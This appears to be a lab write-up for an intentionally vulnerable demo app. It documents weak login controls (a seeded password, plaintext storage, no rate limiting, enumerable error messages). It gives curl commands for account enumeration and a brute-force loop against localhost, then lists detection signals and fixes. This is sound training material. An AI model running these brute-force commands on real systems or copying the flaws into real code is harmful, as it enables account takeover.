# Weak Authentication Controls

## Target

- Route: `POST /api/login`
- Code: `app/server/src/app.js` (`LAB_VULNERABILITY (weak-auth)`),
  `app/server/src/db.js`, `app/server/src/seedData.js`, `app/server/src/config.js`

## Weaknesses (all intentional)

1. **Seeded weak, reusable password.** The demo account ships with
   `password123` (`DEMO_CREDENTIALS` in `config.js`), shown in the UI in dev
   mode.
2. **Plaintext password storage.** The `users.password` column stores the raw
   password; login compares strings directly. No hashing/salting.
3. **No rate limiting or lockout.** Login accepts unlimited attempts, so online
   brute force / password spraying is unbounded.
4. **Verbose, enumerable failures.** A wrong email returns
   `No account found for <email>.` while a wrong password returns
   `Incorrect password for this account.` — letting an attacker enumerate which
   emails are valid.

## Safe local proof-of-concept

Run against your **local** instance only — this is your own lab account.

### Account enumeration

```bash
# Unknown email -> distinct message
curl -s -X POST http://127.0.0.1:4000/api/login \
  -H 'content-type: application/json' \
  -d '{"email":"ghost@nope.local","password":"x"}'
# {"error":"No account found for ghost@nope.local."}

# Known email, wrong password -> different message
curl -s -X POST http://127.0.0.1:4000/api/login \
  -H 'content-type: application/json' \
  -d '{"email":"farmer@securefarm.local","password":"x"}'
# {"error":"Incorrect password for this account."}
```

### Unbounded brute force (small demo wordlist)

```bash
for pw in admin letmein password password123; do
  echo -n "$pw -> "
  curl -s -X POST http://127.0.0.1:4000/api/login \
    -H 'content-type: application/json' \
    -d "{\"email\":\"farmer@securefarm.local\",\"password\":\"$pw\"}"
  echo
done
# No throttling; password123 succeeds and returns a token.
```

Keep the wordlist tiny and local. Do **not** point this at any system you do not
own.

## Expected detection signal (AWS phase)

- CloudWatch metric filter / alarm on a burst of `401` responses from
  `/api/login`.
- Repeated logins from one source IP in ALB access logs.
- GuardDuty findings for brute-force patterns against the instance.

## Eventual fix

- Hash passwords with bcrypt/argon2; never store or compare plaintext.
- Return a single generic message (`Invalid email or password.`) for all login
  failures.
- Add per-IP and per-account rate limiting plus temporary lockout/backoff.
- Remove demo credentials from any non-dev build.
